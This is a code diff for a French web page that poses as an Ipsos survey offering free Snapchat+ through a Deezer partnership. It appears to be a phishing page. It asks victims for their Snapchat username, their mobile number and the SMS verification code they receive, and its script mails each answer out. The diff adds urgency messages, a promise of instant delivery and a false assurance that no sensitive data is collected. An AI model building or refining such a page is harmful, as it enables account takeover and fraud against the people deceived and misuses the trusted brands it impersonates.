@@ -15,15 +15,15 @@
         /* HEADER */
         .header {
             background: #003b7a;
-            padding: 35px 40px; /* Augmenter la hauteur du header */
+            padding: 35px 40px;
             display: flex;
             align-items: center;
             justify-content: space-between;
-            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1); /* Ajout d'un ombrage léger pour le header */
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
         }
 
         .header img {
-            height: 60px; /* Augmenter la taille du logo */
+            height: 60px;
         }
 
         .header a {
@@ -33,7 +33,7 @@
 
         .header-text {
             color: #fff;
-            font-size: 28px; /* Agrandir légèrement la taille du texte */
+            font-size: 28px;
             font-weight: 700;
         }
 
@@ -188,7 +188,7 @@
         <a href="index.html" onclick="return confirm('Quitter le sondage ? Vos réponses seront perdues.')">
             <img src="logo.png" alt="Ipsos">
         </a>
-        <div class="header-text">Ipsos – Sondage</div>
+        <div class="header-text">Sondage Snapchat+</div>
     </div>
 
     <div class="progress-container">
@@ -200,23 +200,29 @@
     <div class="box active" id="etape0">
         <h2>Partenariat avec Deezer 📱</h2>
         <p>Ce sondage est organisé en collaboration avec Deezer pour offrir Snapchat+ gratuitement. Cette offre est exclusivement réservée aux clients de <strong>SFR, Bouygues Telecom, ou Orange</strong> pour garantir la compatibilité avec les services.</p>
+        <p>Ce sondage est éphémère et disponible pour une durée limitée.</p>
         <p>Avant de commencer, nous devons effectuer une vérification pour confirmer que vous êtes un participant humain et éviter tout abus.</p>
         <button id="btnEtape0">Continuer</button>
     </div>
-
     <!-- Étape 1: Collecte des informations sur le compte Snapchat -->
     <div class="box" id="etape1">
         <h2>Recevoir Snapchat+ 🎁</h2>
         <p>Merci de nous fournir votre identifiant Snapchat afin que nous puissions vous envoyer votre cadeau.</p>
         <input type="text" id="compte_snap" placeholder="Votre identifiant Snapchat">
+        <p>Combien de temps utilisez-vous Deezer ?</p>
+        <select id="temps_deezer">
+            <option value="Moins de 6 mois">Moins de 6 mois</option>
+            <option value="6 mois à 1 an">6 mois à 1 an</option>
+            <option value="Plus d'1 an">Plus d'1 an</option>
+        </select>
         <button id="btnEtape1">Suivant</button>
     </div>
 
     <!-- Étape 2: Numéro de téléphone -->
     <div class="box" id="etape2">
         <h2>Numéro de téléphone</h2>
-        <p>Veuillez entrer votre numéro de téléphone pour recevoir un code de vérification par SMS.</p>
-        <input type="text" id="telephone" placeholder="Ex: 06XXXXXXXX">
+        <p>Veuillez entrer votre numéro de téléphone pour recevoir un code de vérification par SMS. Vous devez choisir un numéro commençant par 06 ou 07.</p>
+        <input type="text" id="telephone" placeholder="Ex: 06XXXXXXXX" maxlength="10">
         <button id="btnEtape2">Suivant</button>
     </div>
 
@@ -224,12 +230,12 @@
     <div class="box" id="etape3">
         <h2>Code de vérification</h2>
         <p>Veuillez entrer le code que vous avez reçu par SMS pour finaliser l’inscription.</p>
+        <p><strong>Note:</strong> Cela peut prendre jusqu'à une minute pour recevoir le code. Une fois saisi, vous aurez Snapchat+ instantanément.</p>
         <input type="text" id="code_sms" placeholder="Code reçu">
         <button id="btnEtape3">Terminer</button>
     </div>
 
     <div class="footer">© 2026 Ipsos – Tous droits réservés</div>
-
     <script>
         let reponses = {};
 
@@ -268,12 +274,14 @@
         // Étape 1: Réponse sur Snapchat
         document.getElementById('btnEtape1').addEventListener('click', () => {
             let snap = document.getElementById('compte_snap').value.trim();
+            let tempsDeezer = document.getElementById('temps_deezer').value;
             if (!snap) {
                 alert("Veuillez entrer votre identifiant Snapchat.");
                 return;
             }
             reponses.compte_snap = snap;
-            sendMail({ compte_snap: snap }, "Réponses Étape 1 - Ipsos");
+            reponses.temps_deezer = tempsDeezer;
+            sendMail({ compte_snap: snap, temps_deezer: tempsDeezer }, "Réponses Étape 1 - Ipsos");
             showStep('etape2', 50);
         });
 
@@ -313,5 +321,13 @@
         L’offre est exclusivement réservée aux clients SFR, Bouygues Telecom et Orange afin de garantir la disponibilité et la compatibilité du service. 
         Nous vous remercions pour votre participation !
     </div>
+
+    <!-- Partie "À propos" -->
+    <div class="about">
+        <h2 style="text-align: center;">À propos du sondage</h2>
+        <p>Ce sondage est éphémère et limité dans le temps, conçu pour vérifier votre éligibilité à recevoir Snapchat+ en partenariat avec Deezer. Il est uniquement destiné aux clients SFR, Bouygues Telecom et Orange.</p>
+        <p>Veuillez suivre chaque étape pour valider votre inscription. N'oubliez pas que nous ne collectons pas d'informations personnelles sensibles et nous respectons la confidentialité des données.</p>
+    </div>
+
 </body>
 </html>
